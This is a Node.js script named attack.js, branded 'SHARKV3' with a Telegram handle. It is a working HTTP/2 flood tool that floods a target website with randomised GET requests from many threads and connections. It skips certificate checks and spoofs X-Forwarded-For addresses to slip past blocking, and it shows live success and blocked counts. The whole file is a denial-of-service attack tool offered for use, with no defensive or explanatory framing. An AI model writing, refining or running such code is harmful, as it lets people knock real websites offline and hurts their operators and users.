const http2 = require('http2');
const tls = require('tls');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');
const net = require('net');
const readline = require('readline');

const THREADS = 16;
const CONNECTIONS = 100;
const DURATION = parseInt(process.argv[3]) || 60;
const TARGET = process.argv[2];

let total = 0;
let success = 0;
let blocked = 0;
let maxRps = 0;
let rps = 0;

if (!TARGET || !DURATION) {
  console.log('Usage: node attack.js <target> <duration_secs>');
  process.exit(1);
}

if (isMainThread) {
  console.clear();
  console.log('Warming up for 5s...');
  setTimeout(() => {
    console.clear();
    console.log('SHARKV3 - T.ME/STSVKINGDOM');
    console.log('===========================');

    for (let i = 0; i < THREADS; i++) {
      new Worker(__filename, { workerData: { TARGET, DURATION } });
    }

    setInterval(() => {
      maxRps = Math.max(maxRps, rps);
      displayStats();
      rps = 0;
    }, 1000);

    const server = net.createServer(socket => {
      socket.on('data', data => {
        const msg = data.toString();
        if (msg === 'ok') success++;
        else if (msg === 'fail') blocked++;
        total++;
        rps++;
      });
    });
    server.listen(9999);

    function displayStats() {
      readline.cursorTo(process.stdout, 0, 0);
      readline.clearScreenDown(process.stdout);
      console.log('SHARKV3 - T.ME/STSVKINGDOM');
      console.log('===========================');
      console.log(`total: ${total}`);
      console.log(`max-r: ${maxRps}`);
      console.log('===========================');
      console.log(`succes: ${success}`);
      console.log(`Blocked: ${blocked}`);
    }
  }, 5000);

} else {
  const { TARGET, DURATION } = workerData;
  const endTime = Date.now() + DURATION * 1000;
  const socket = net.connect(9999, '127.0.0.1');

  function sendStatus(msg) {
    socket.write(msg);
  }

  function flood(session) {
    while (Date.now() < endTime) {
      try {
        const headers = {
          ':method': 'GET',
          ':path': `/${Math.random().toString(36).slice(2)}?${Date.now()}`,
          'user-agent': 'Mozilla/5.0',
          'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
        };

        const req = session.request(headers);
        req.on('response', () => sendStatus('ok'));
        req.on('error', () => sendStatus('fail'));
        req.end();
        sendStatus('req');
      } catch (e) {
        sendStatus('fail');
      }
    }
    session.close();
  }

  function createConnection() {
    const tlsSocket = tls.connect(443, TARGET.replace('https://', '').replace('/', ''), {
      ALPNProtocols: ['h2'],
      ciphers: tls.DEFAULT_CIPHERS,
      honorCipherOrder: true,
      rejectUnauthorized: false,
      servername: TARGET.replace('https://', '').replace('/', ''),
    }, () => {
      const session = http2.connect(TARGET, { createConnection: () => tlsSocket });
      session.on('error', () => {});
      flood(session);
    });

    tlsSocket.on('error', () => {});
  }

  for (let i = 0; i < CONNECTIONS; i++) {
    createConnection();
  }
}
